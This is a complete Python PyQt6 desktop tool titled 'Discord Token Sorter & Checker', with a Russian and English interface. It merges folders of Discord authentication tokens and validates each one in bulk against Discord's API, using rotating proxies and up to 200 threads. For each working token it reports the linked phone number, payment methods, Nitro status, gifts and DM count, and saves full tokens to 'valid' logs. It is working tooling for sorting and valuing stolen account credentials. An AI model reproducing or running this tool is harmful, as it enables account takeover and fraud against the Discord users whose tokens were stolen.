import sys
import os
import requests
import threading
from datetime import datetime
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, Tuple, Optional, List, Set
from functools import lru_cache

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, QHBoxLayout,
    QFileDialog, QLabel, QToolButton, QStatusBar, QCheckBox, QTextEdit, QGridLayout
)
from PyQt6.QtCore import QThread, pyqtSignal, Qt, QSettings
from PyQt6.QtGui import QIcon
from qfluentwidgets import setTheme, Theme, PrimaryPushButton, BodyLabel, ComboBox, CheckBox, InfoBar, InfoBarPosition

# Функция для работы с ресурсами в .exe
def resource_path(relative_path):
    """Получает абсолютный путь к ресурсу, работает в .exe и в разработке."""
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

# Глобальные константы
setTheme(Theme.DARK)
FILE_LOCK = threading.Lock()
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
DISCORD_API_BASE = "https://discord.com/api/v9/users/@me"
REQUEST_TIMEOUT = 5

BADGE_FLAGS = {
    1 << 0: "Discord Employee", 1 << 1: "Partnered Server Owner", 1 << 2: "Hypesquad Events",
    1 << 3: "Bug Hunter Level 1", 1 << 6: "Hypesquad House 1 (Bravery)", 1 << 7: "Hypesquad House 2 (Brilliance)",
    1 << 8: "Hypesquad House 3 (Balance)", 1 << 9: "Early Supporter", 1 << 10: "Team User",
    1 << 14: "Bug Hunter Level 2", 1 << 16: "Verified Bot Developer", 1 << 17: "Early Verified Bot Developer",
    1 << 18: "Discord Certified Moderator"
}

@lru_cache(maxsize=1000)
def check_token(token: str, proxy: Optional[str] = None) -> Tuple[bool, Optional[Dict]]:
    """Проверяет токен Discord через API и возвращает статус и данные."""
    headers = {"Authorization": token, "User-Agent": USER_AGENT}
    proxies = {"http": proxy, "https": proxy} if proxy else None
    endpoints = {
        "user": f"{DISCORD_API_BASE}",
        "payment": f"{DISCORD_API_BASE}/billing/payment-sources",
        "gifts": f"{DISCORD_API_BASE}/gifts",
        "dm": f"{DISCORD_API_BASE}/channels"
    }

    try:
        with requests.Session() as session:
            session.headers.update(headers)
            session.proxies.update(proxies or {})
            user_response = session.get(endpoints["user"], timeout=REQUEST_TIMEOUT)
            if user_response.status_code != 200:
                return False, {"error": f"Status {user_response.status_code}"}

            user_data = user_response.json()
            responses = {"user": user_data}
            for key, url in endpoints.items():
                if key != "user":
                    resp = session.get(url, timeout=REQUEST_TIMEOUT)
                    responses[key] = resp.json() if resp.status_code == 200 else []

        created_at = datetime.fromtimestamp(((int(user_data["id"]) >> 22) + 1420070400000) / 1000).strftime('%Y-%m-%d %H:%M:%S')
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png" if user_data.get("avatar") else None
        badges = [name for flag, name in BADGE_FLAGS.items() if user_data.get("public_flags", 0) & flag]

        return True, {
            "username": f"{user_data['username']}#{user_data['discriminator']}",
            "nitro": user_data.get("premium_type", 0) in [1, 2],
            "phone": user_data.get("phone"),
            "payment": len(responses["payment"]) > 0,
            "verified": user_data.get("verified", False),
            "badges": badges or None,
            "gifts": len(responses["gifts"]),
            "dm_history": len(responses["dm"]),
            "created_at": created_at,
            "avatar_url": avatar_url
        }
    except requests.RequestException as e:
        return False, {"error": str(e)}

class LanguageManager:
    """Управляет переводами и языковыми настройками."""
    def __init__(self):
        self.settings = QSettings("MyApp", "LanguageSettings")
        self.current_language = self.settings.value("language", "ru")
        self.translations = self._load_translations()

    @staticmethod
    def _load_translations() -> Dict[str, Dict[str, str]]:
        """Загружает словари переводов."""
        return {
            "ru": {
                "select_token_folder": "Выберите папку с токенами:", "select_save_location": "Выберите место сохранения:",
                "remove_duplicates": "Удалять дубликаты", "select_token_list": "Выберите список токенов:",
                "select_proxy_file": "Выберите файл прокси (опционально):", "select_save_folder": "Выберите папку для сохранения:",
                "select_checks": "Выберите проверки:", "validity_check": "Валидность токена", "nitro_check": "Nitro на аккаунте",
                "phone_check": "Привязан телефон", "payment_check": "Привязаны методы оплаты", "verification_check": "Есть верификация",
                "badges_check": "Значки аккаунта", "gifts_check": "Подарки", "dm_history_check": "История DM",
                "created_at_check": "Дата создания", "avatar_check": "Превью аватарки", "thread_count": "Количество потоков:",
                "start": "Начать", "stop": "Остановить", "sorter_tab": "Сортер", "checker_tab": "Чекер",
                "warning_select_folder_and_save": "Выберите папку и место сохранения.",
                "warning_select_tokens_and_folder": "Выберите файл токенов и папку сохранения.",
                "warning_select_one_check": "Выберите хотя бы одну проверку.", "warning_title": "Предупреждение",
                "selected_folder": "Выбрана папка: {folder}", "found_tokens": "Обнаружено токенов: {count}",
                "selected_save_file": "Выбран файл сохранения: {file}", "selected_token_file": "Выбран файл токенов: {file}",
                "selected_proxy_file": "Выбран файл прокси: {file}", "selected_save_folder": "Выбрана папка сохранения: {folder}",
                "processing_file": "Обработка файла: {file}", "sorting_completed": "Сортировка завершена. Всего токенов: {count}",
                "duplicates_removed": "Удалено дубликатов: {count}", "sorting_stopped": "Сортировка остановлена.",
                "error": "Ошибка: {error}", "found_tokens_checker": "Найдено токенов: {count}", "found_proxies": "Найдено прокси: {count}",
                "checking_completed": "Проверка завершена. Невалидных токенов: {count}", "checking_stopped": "Проверка остановлена.",
                "token_valid": "✅ Токен: {token} - Валиден", "token_invalid": "❌ Токен: {token} - Невалиден",
                "nickname": "Ник: {username}", "nitro": "Nitro: {status}", "phone": "Телефон: {status}",
                "verified": "Верифицирован: {status}", "payment": "Платежки: {status}", "badges": "Значки: {status}",
                "gifts": "Подарки: {count}", "dm_history": "DM История: {count}", "created_at": "Дата создания: {date}",
                "avatar": "Аватарка: {url}", "yes": "+ ({details})", "no": "- (нет)", "email_confirmed": "email confirmed",
                "badges_list": "{count} значков: {badges}", "browse": "Обзор...", "save_valid_logs": "Сохранить лог валидных",
                "select_all": "Выбрать все", "deselect_all": "Снять все", "proxy_info": "Прокси: {proxy}. Ошибка: {error}"
            },
            "en": {
                "select_token_folder": "Select token folder:", "select_save_location": "Select save location:",
                "remove_duplicates": "Remove duplicates", "select_token_list": "Select token list:",
                "select_proxy_file": "Select proxy file (optional):", "select_save_folder": "Select folder to save:",
                "select_checks": "Select checks:", "validity_check": "Token validity", "nitro_check": "Nitro on account",
                "phone_check": "Phone linked", "payment_check": "Payment methods linked", "verification_check": "Verified",
                "badges_check": "Account badges", "gifts_check": "Gifts", "dm_history_check": "DM History",
                "created_at_check": "Creation date", "avatar_check": "Avatar preview", "thread_count": "Number of threads:",
                "start": "Start", "stop": "Stop", "sorter_tab": "Sorter", "checker_tab": "Checker",
                "warning_select_folder_and_save": "Select folder and save location.",
                "warning_select_tokens_and_folder": "Select token file and save folder.",
                "warning_select_one_check": "Select at least one check.", "warning_title": "Warning",
                "selected_folder": "Selected folder: {folder}", "found_tokens": "Found tokens: {count}",
                "selected_save_file": "Selected save file: {file}", "selected_token_file": "Selected token file: {file}",
                "selected_proxy_file": "Selected proxy file: {file}", "selected_save_folder": "Selected save folder: {folder}",
                "processing_file": "Processing file: {file}", "sorting_completed": "Sorting completed. Total tokens: {count}",
                "duplicates_removed": "Removed duplicates: {count}", "sorting_stopped": "Sorting stopped.",
                "error": "Error: {error}", "found_tokens_checker": "Found tokens: {count}", "found_proxies": "Found proxies: {count}",
                "checking_completed": "Checking completed. Invalid tokens: {count}", "checking_stopped": "Checking stopped.",
                "token_valid": "✅ Token: {token} - Valid", "token_invalid": "❌ Token: {token} - Invalid",
                "nickname": "Nickname: {username}", "nitro": "Nitro: {status}", "phone": "Phone: {status}",
                "verified": "Verified: {status}", "payment": "Payments: {status}", "badges": "Badges: {status}",
                "gifts": "Gifts: {count}", "dm_history": "DM History: {count}", "created_at": "Created at: {date}",
                "avatar": "Avatar: {url}", "yes": "+ ({details})", "no": "- (none)", "email_confirmed": "email confirmed",
                "badges_list": "{count} badges: {badges}", "browse": "Browse...", "save_valid_logs": "Save valid logs",
                "select_all": "Select all", "deselect_all": "Deselect all", "proxy_info": "Proxy: {proxy}. Error: {error}"
            }
        }

    def set_language(self, lang: str) -> None:
        self.current_language = lang
        self.settings.setValue("language", lang)

    def translate(self, key: str, **kwargs) -> str:
        return self.translations[self.current_language][key].format(**kwargs)

language_manager = LanguageManager()

class SorterThread(QThread):
    """Поток для сортировки токенов из файлов."""
    log_signal = pyqtSignal(str)
    finished_signal = pyqtSignal()

    def __init__(self, folder_path: str, save_path: str, remove_duplicates: bool):
        super().__init__()
        self.folder_path = folder_path
        self.save_path = save_path
        self.remove_duplicates = remove_duplicates
        self.running = True

    def run(self) -> None:
        try:
            tokens: Set[str] | List[str] = set() if self.remove_duplicates else []
            for root, _, files in os.walk(self.folder_path):
                if not self.running:
                    break
                for file in files:
                    if file.endswith('.txt'):
                        file_path = os.path.join(root, file)
                        self.log_signal.emit(language_manager.translate("processing_file", file=file_path))
                        with FILE_LOCK:
                            with open(file_path, 'r', encoding="utf-8") as infile:
                                lines = infile.read().splitlines()
                                if self.remove_duplicates:
                                    tokens.update(line.strip() for line in lines if line.strip())
                                else:
                                    tokens.extend(line.strip() for line in lines if line.strip())
            if self.running:
                with FILE_LOCK:
                    with open(self.save_path, 'w', encoding="utf-8") as outfile:
                        outfile.write('\n'.join(tokens))
                duplicates = len(tokens) - len(set(tokens)) if not self.remove_duplicates else 0
                self.log_signal.emit(language_manager.translate("sorting_completed", count=len(tokens)))
                if duplicates > 0:
                    self.log_signal.emit(language_manager.translate("duplicates_removed", count=duplicates))
            else:
                self.log_signal.emit(language_manager.translate("sorting_stopped"))
        except Exception as e:
            self.log_signal.emit(language_manager.translate("error", error=str(e)))
        self.finished_signal.emit()

    def stop(self) -> None:
        self.running = False

class CheckerThread(QThread):
    """Поток для проверки токенов через Discord API."""
    log_signal = pyqtSignal(str)
    finished_signal = pyqtSignal()

    def __init__(self, token_file: str, proxy_file: Optional[str], save_folder: str, checks: List[str], threads: int, auto_clear_logs: bool, show_avatar: bool):
        super().__init__()
        self.token_file = token_file
        self.proxy_file = proxy_file
        self.save_folder = save_folder
        self.checks = checks
        self.threads = threads
        self.auto_clear_logs = auto_clear_logs
        self.show_avatar = show_avatar
        self.running = True
        self.valid_logs: List[str] = []

    def run(self) -> None:
        try:
            with FILE_LOCK:
                with open(self.token_file, 'r', encoding="utf-8") as f:
                    tokens = [line.strip() for line in f if line.strip()]
            self.log_signal.emit(language_manager.translate("found_tokens_checker", count=len(tokens)))

            proxies = []
            if self.proxy_file:
                with FILE_LOCK:
                    with open(self.proxy_file, 'r', encoding="utf-8") as f:
                        proxies = [line.strip() for line in f if line.strip()]
                proxy_types = set("HTTP" if p.startswith("http://") else "HTTPS" if p.startswith("https://") else "IP:port" if ":" in p else "Unknown" for p in proxies)
                self.log_signal.emit(language_manager.translate("found_proxies", count=len(proxies)) + f" (Формат: {', '.join(proxy_types)})")
            
            proxy_cycle = cycle(proxies) if proxies else cycle([None])
            invalid_count = 0

            def process_token(token: str, proxy: Optional[str]) -> None:
                nonlocal invalid_count
                if not self.running:
                    return
                is_valid, details = check_token(token, proxy)
                log_message = "<hr><div>"
                if is_valid and details:
                    log_message += f"<span style='color: green;'>{language_manager.translate('token_valid', token=token[:10] + '...')}</span><br>"
                    log_message += language_manager.translate('nickname', username=details['username']) + "<br>"
                    log_message += language_manager.translate('created_at', date=details['created_at']) + "<br>"
                    log_message += language_manager.translate('verified', status=(language_manager.translate('yes', details=language_manager.translate('email_confirmed')) if details['verified'] else language_manager.translate('no'))) + "<br>"
                    log_message += language_manager.translate('nitro', status=(language_manager.translate('yes', details='present') if details['nitro'] else language_manager.translate('no'))) + "<br>"
                    log_message += language_manager.translate('phone', status=(language_manager.translate('yes', details=details['phone']) if details['phone'] else language_manager.translate('no'))) + "<br>"
                    log_message += language_manager.translate('payment', status=(language_manager.translate('yes', details='card') if details['payment'] else language_manager.translate('no'))) + "<br>"
                    log_message += language_manager.translate('gifts', count=details['gifts']) + "<br>"
                    log_message += language_manager.translate('dm_history', count=details['dm_history']) + "<br>"
                    badges_str = language_manager.translate('badges_list', count=len(details['badges']), badges=', '.join(details['badges'])) if details["badges"] else language_manager.translate('no')
                    log_message += language_manager.translate('badges', status=badges_str) + "<br>"
                    if self.show_avatar and details["avatar_url"]:
                        log_message += language_manager.translate('avatar', url=details['avatar_url']) + f" <img src='{details['avatar_url']}' width='30' height='30' style='vertical-align:middle;'><br>"

                    valid_log = (
                        f"VALID TOKEN:\nТокен: {token}\n"
                        f"{language_manager.translate('nickname', username=details['username'])}\n"
                        f"{language_manager.translate('created_at', date=details['created_at'])}\n"
                        f"{language_manager.translate('verified', status=(language_manager.translate('yes', details=language_manager.translate('email_confirmed')) if details['verified'] else language_manager.translate('no')))}\n"
                        f"{language_manager.translate('nitro', status=(language_manager.translate('yes', details='present') if details['nitro'] else language_manager.translate('no')))}\n"
                        f"{language_manager.translate('phone', status=(language_manager.translate('yes', details=details['phone']) if details['phone'] else language_manager.translate('no')))}\n"
                        f"{language_manager.translate('payment', status=(language_manager.translate('yes', details='card') if details['payment'] else language_manager.translate('no')))}\n"
                        f"{language_manager.translate('gifts', count=details['gifts'])}\n"
                        f"{language_manager.translate('dm_history', count=details['dm_history'])}\n"
                        f"{language_manager.translate('badges', status=', '.join(details['badges']) if details['badges'] else language_manager.translate('no'))}\n"
                    )
                    if self.show_avatar and details["avatar_url"]:
                        valid_log += f"{language_manager.translate('avatar', url=details['avatar_url'])}\n"
                    self.valid_logs.append(valid_log)
                else:
                    log_message += f"<span style='color: red;'>{language_manager.translate('token_invalid', token=token[:10] + '...')}</span><br>"
                    if proxy and details:
                        log_message += language_manager.translate("proxy_info", proxy=proxy, error=details.get("error", "Неизвестная ошибка")) + "<br>"
                    invalid_count += 1
                log_message += "</div>"
                self.log_signal.emit(log_message)

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(process_token, token, next(proxy_cycle)): token for token in tokens}
                for future in futures:
                    if not self.running:
                        break
                    try:
                        future.result()
                    except Exception as e:
                        self.log_signal.emit(language_manager.translate("error", error=str(e)))
                        invalid_count += 1

            if self.running:
                self.log_signal.emit(language_manager.translate("checking_completed", count=invalid_count))
            else:
                self.log_signal.emit(language_manager.translate("checking_stopped"))
        except Exception as e:
            self.log_signal.emit(language_manager.translate("error", error=str(e)))
        self.finished_signal.emit()

    def stop(self) -> None:
        self.running = False

class SorterTab(QWidget):
    """Вкладка сортировки токенов."""
    def __init__(self):
        super().__init__()
        layout = QVBoxLayout(self)
        self.folder_label = BodyLabel(language_manager.translate("select_token_folder"))
        self.folder_button = PrimaryPushButton(language_manager.translate("browse"))
        self.save_label = BodyLabel(language_manager.translate("select_save_location"))
        self.save_button = PrimaryPushButton(language_manager.translate("browse"))
        self.remove_duplicates = CheckBox(language_manager.translate("remove_duplicates"))
        self.log_text = QTextEdit(readOnly=True, acceptRichText=True)
        self.start_button = PrimaryPushButton(language_manager.translate("start"))

        layout.addWidget(self.folder_label)
        layout.addWidget(self.folder_button)
        layout.addWidget(self.save_label)
        layout.addWidget(self.save_button)
        layout.addWidget(self.remove_duplicates)
        layout.addWidget(self.log_text)
        layout.addWidget(self.start_button)

        self.is_running = False
        self.folder_button.clicked.connect(self.select_folder)
        self.save_button.clicked.connect(self.select_save_file)
        self.start_button.clicked.connect(self.toggle_sorting)

    def update_language(self) -> None:
        self.folder_label.setText(language_manager.translate("select_token_folder"))
        self.save_label.setText(language_manager.translate("select_save_location"))
        self.remove_duplicates.setText(language_manager.translate("remove_duplicates"))
        self.folder_button.setText(language_manager.translate("browse"))
        self.save_button.setText(language_manager.translate("browse"))
        self.start_button.setText(language_manager.translate("start") if not self.is_running else language_manager.translate("stop"))

    def select_folder(self) -> None:
        folder = QFileDialog.getExistingDirectory(self, "Select Folder")
        if folder:
            self.folder_path = folder
            tokens = sum(1 for root, _, files in os.walk(folder) for file in files if file.endswith('.txt') for line in open(os.path.join(root, file), 'r', encoding="utf-8") if line.strip())
            self.log_text.append(language_manager.translate("selected_folder", folder=folder))
            self.log_text.append(language_manager.translate("found_tokens", count=tokens))

    def select_save_file(self) -> None:
        file, _ = QFileDialog.getSaveFileName(self, "Select File", "", "Text Files (*.txt)")
        if file:
            self.save_path = file
            self.log_text.append(language_manager.translate("selected_save_file", file=file))

    def toggle_sorting(self) -> None:
        if not self.is_running:
            if not hasattr(self, 'folder_path') or not hasattr(self, 'save_path'):
                InfoBar.warning(
                    title=language_manager.translate("warning_title"),
                    content=language_manager.translate("warning_select_folder_and_save"),
                    orient=InfoBarPosition.TOP,
                    parent=self
                )
                return
            self.is_running = True
            self.start_button.setText(language_manager.translate("stop"))
            self.folder_button.setEnabled(False)
            self.save_button.setEnabled(False)
            self.sorter_thread = SorterThread(self.folder_path, self.save_path, self.remove_duplicates.isChecked())
            self.sorter_thread.log_signal.connect(self.log_text.append)
            self.sorter_thread.finished_signal.connect(self.sorting_finished)
            self.sorter_thread.start()
        else:
            self.is_running = False
            self.sorter_thread.stop()

    def sorting_finished(self) -> None:
        self.is_running = False
        self.start_button.setText(language_manager.translate("start"))
        self.folder_button.setEnabled(True)
        self.save_button.setEnabled(True)

class CheckerTab(QWidget):
    """Вкладка проверки токенов."""
    def __init__(self):
        super().__init__()
        self.setMinimumHeight(350)
        main_layout = QVBoxLayout(self)

        self.token_label = BodyLabel(language_manager.translate("select_token_list"))
        self.token_button = PrimaryPushButton(language_manager.translate("browse"))
        self.proxy_label = BodyLabel(language_manager.translate("select_proxy_file"))
        self.proxy_button = PrimaryPushButton(language_manager.translate("browse"))
        self.save_folder_label = BodyLabel(language_manager.translate("select_save_folder"))
        self.save_button = PrimaryPushButton(language_manager.translate("browse"))
        self.checks_label = BodyLabel(language_manager.translate("select_checks"))

        check_container = QWidget()
        check_container.setFixedHeight(150)
        self.checkes_layout = QGridLayout()
        self.checkes_layout.setSpacing(10)
        self.checkes_layout.setContentsMargins(0, 0, 0, 0)
        self.checks = {
            "validity": CheckBox(language_manager.translate("validity_check")),
            "nitro": CheckBox(language_manager.translate("nitro_check")),
            "phone": CheckBox(language_manager.translate("phone_check")),
            "payment": CheckBox(language_manager.translate("payment_check")),
            "verification": CheckBox(language_manager.translate("verification_check")),
            "badges": CheckBox(language_manager.translate("badges_check")),
            "gifts": CheckBox(language_manager.translate("gifts_check")),
            "dm_history": CheckBox(language_manager.translate("dm_history_check")),
            "created_at": CheckBox(language_manager.translate("created_at_check")),
            "avatar": CheckBox(language_manager.translate("avatar_check"))
        }
        row, col = 0, 0
        for checkbox in self.checks.values():
            self.checkes_layout.addWidget(checkbox, row, col)
            col += 1
            if col >= 2:
                col = 0
                row += 1
        check_container.setLayout(self.checkes_layout)

        self.select_all_button = PrimaryPushButton(language_manager.translate("select_all"))
        self.select_all_button.setMaximumWidth(120)
        self.threads_label = BodyLabel(language_manager.translate("thread_count"))
        self.thread_combo = ComboBox()
        self.thread_combo.addItems(["1", "10", "20", "50", "80", "100", "125", "150", "175", "200"])
        self.log_text = QTextEdit(readOnly=True, acceptRichText=True)

        bottom_layout = QHBoxLayout()
        self.auto_clear_logs = QCheckBox("Авто-очистка логов")
        self.save_log_button = PrimaryPushButton(language_manager.translate("save_valid_logs"))
        self.save_log_button.setMaximumWidth(180)
        bottom_layout.addWidget(self.auto_clear_logs)
        bottom_layout.addWidget(self.save_log_button)

        self.start_button = PrimaryPushButton(language_manager.translate("start"))

        main_layout.addWidget(self.token_label)
        main_layout.addWidget(self.token_button)
        main_layout.addWidget(self.proxy_label)
        main_layout.addWidget(self.proxy_button)
        main_layout.addWidget(self.save_folder_label)
        main_layout.addWidget(self.save_button)
        main_layout.addWidget(self.checks_label)
        main_layout.addWidget(check_container)
        main_layout.addWidget(self.select_all_button)
        main_layout.addWidget(self.threads_label)
        main_layout.addWidget(self.thread_combo)
        main_layout.addWidget(self.log_text)
        main_layout.addLayout(bottom_layout)
        main_layout.addWidget(self.start_button)

        self.is_running = False
        self.token_button.clicked.connect(self.select_token_file)
        self.proxy_button.clicked.connect(self.select_proxy_file)
        self.save_button.clicked.connect(self.select_save_folder)
        self.start_button.clicked.connect(self.toggle_checking)
        self.select_all_button.clicked.connect(self.toggle_select_all)
        self.save_log_button.clicked.connect(self.save_valid_log)

    def update_language(self) -> None:
        self.token_label.setText(language_manager.translate("select_token_list"))
        self.proxy_label.setText(language_manager.translate("select_proxy_file"))
        self.save_folder_label.setText(language_manager.translate("select_save_folder"))
        self.checks_label.setText(language_manager.translate("select_checks"))
        for key, checkbox in self.checks.items():
            checkbox.setText(language_manager.translate(f"{key}_check"))
        self.threads_label.setText(language_manager.translate("thread_count"))
        self.token_button.setText(language_manager.translate("browse"))
        self.proxy_button.setText(language_manager.translate("browse"))
        self.save_button.setText(language_manager.translate("browse"))
        self.start_button.setText(language_manager.translate("start") if not self.is_running else language_manager.translate("stop"))
        self.select_all_button.setText(language_manager.translate("select_all"))
        self.save_log_button.setText(language_manager.translate("save_valid_logs"))

    def toggle_select_all(self) -> None:
        all_checked = all(cb.isChecked() for cb in self.checks.values())
        for cb in self.checks.values():
            cb.setChecked(not all_checked)
        self.select_all_button.setText(language_manager.translate("deselect_all" if not all_checked else "select_all"))

    def select_token_file(self) -> None:
        file, _ = QFileDialog.getOpenFileName(self, "Select File", "", "Text Files (*.txt)")
        if file:
            self.token_file = file
            self.log_text.append(language_manager.translate("selected_token_file", file=file))

    def select_proxy_file(self) -> None:
        file, _ = QFileDialog.getOpenFileName(self, "Select File", "", "Text Files (*.txt)")
        if file:
            self.proxy_file = file
            self.log_text.append(language_manager.translate("selected_proxy_file", file=file))
        else:
            self.proxy_file = None

    def select_save_folder(self) -> None:
        folder = QFileDialog.getExistingDirectory(self, "Select Folder")
        if folder:
            self.save_folder = folder
            self.log_text.append(language_manager.translate("selected_save_folder", folder=folder))

    def toggle_checking(self) -> None:
        if not self.is_running:
            if not hasattr(self, 'token_file') or not hasattr(self, 'save_folder'):
                InfoBar.warning(
                    title=language_manager.translate("warning_title"),
                    content=language_manager.translate("warning_select_tokens_and_folder"),
                    orient=InfoBarPosition.TOP,
                    parent=self
                )
                return
            selected_checks = [key for key, cb in self.checks.items() if cb.isChecked()]
            if not selected_checks:
                InfoBar.warning(
                    title=language_manager.translate("warning_title"),
                    content=language_manager.translate("warning_select_one_check"),
                    orient=InfoBarPosition.TOP,
                    parent=self
                )
                return
            if self.auto_clear_logs.isChecked():
                self.log_text.clear()
            self.is_running = True
            self.start_button.setText(language_manager.translate("stop"))
            self.token_button.setEnabled(False)
            self.proxy_button.setEnabled(False)
            self.save_button.setEnabled(False)
            threads = int(self.thread_combo.currentText())
            proxy_file = getattr(self, 'proxy_file', None)
            self.checker_thread = CheckerThread(
                self.token_file, proxy_file, self.save_folder, selected_checks, threads,
                self.auto_clear_logs.isChecked(), "avatar" in selected_checks
            )
            self.checker_thread.log_signal.connect(self.log_text.append)
            self.checker_thread.finished_signal.connect(self.checking_finished)
            self.checker_thread.start()
        else:
            self.is_running = False
            self.checker_thread.stop()

    def checking_finished(self) -> None:
        self.is_running = False
        self.start_button.setText(language_manager.translate("start"))
        self.token_button.setEnabled(True)
        self.proxy_button.setEnabled(True)
        self.save_button.setEnabled(True)

    def save_valid_log(self) -> None:
        if not hasattr(self, 'checker_thread') or not self.checker_thread.valid_logs:
            self.log_text.append(language_manager.translate("error", error="Нет валидных логов для сохранения."))
            return
        file, _ = QFileDialog.getSaveFileName(self, language_manager.translate("save_valid_logs"), "", "Text Files (*.txt)")
        if file:
            with FILE_LOCK:
                with open(file, 'w', encoding="utf-8") as f:
                    f.write("\n\n".join(self.checker_thread.valid_logs))
            self.log_text.append(language_manager.translate("selected_save_file", file=file))

class MainWindow(QMainWindow):
    """Главное окно приложения."""
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Discord Token Sorter & Checker")
        self.setWindowIcon(QIcon(resource_path("iconc.ico")))
        self.setFixedWidth(600)
        self.setMinimumHeight(717)

        self.tab_widget = QTabWidget(self)
        self.setCentralWidget(self.tab_widget)
        self.sorter_tab = SorterTab()
        self.checker_tab = CheckerTab()
        self.tab_widget.addTab(self.sorter_tab, language_manager.translate("sorter_tab"))
        self.tab_widget.addTab(self.checker_tab, language_manager.translate("checker_tab"))

        self.watermark = QLabel("by rivzor", self)
        self.watermark.setStyleSheet("font-size: 10px; color: rgba(255, 255, 255, 0.3);")
        self.update_watermark_position()

        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.language_button = QToolButton()
        self.language_button.setFixedSize(30, 30)
        self.status_bar.addWidget(self.language_button)
        self.language_button.clicked.connect(self.toggle_language)
        self.update_language_button()

    def toggle_language(self) -> None:
        new_lang = "en" if language_manager.current_language == "ru" else "ru"
        language_manager.set_language(new_lang)
        self.update_language_button()
        self.sorter_tab.update_language()
        self.checker_tab.update_language()
        self.tab_widget.setTabText(0, language_manager.translate("sorter_tab"))
        self.tab_widget.setTabText(1, language_manager.translate("checker_tab"))
        self.sorter_tab.log_text.clear()
        self.checker_tab.log_text.clear()

    def update_language_button(self) -> None:
        icon = resource_path("flag_ru.png") if language_manager.current_language == "ru" else resource_path("flag_en.png")
        self.language_button.setIcon(QIcon(icon))

    def resizeEvent(self, event) -> None:
        super().resizeEvent(event)
        self.update_watermark_position()

    def update_watermark_position(self) -> None:
        self.watermark.move(self.width() // 2 - 30, self.height() - 40)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())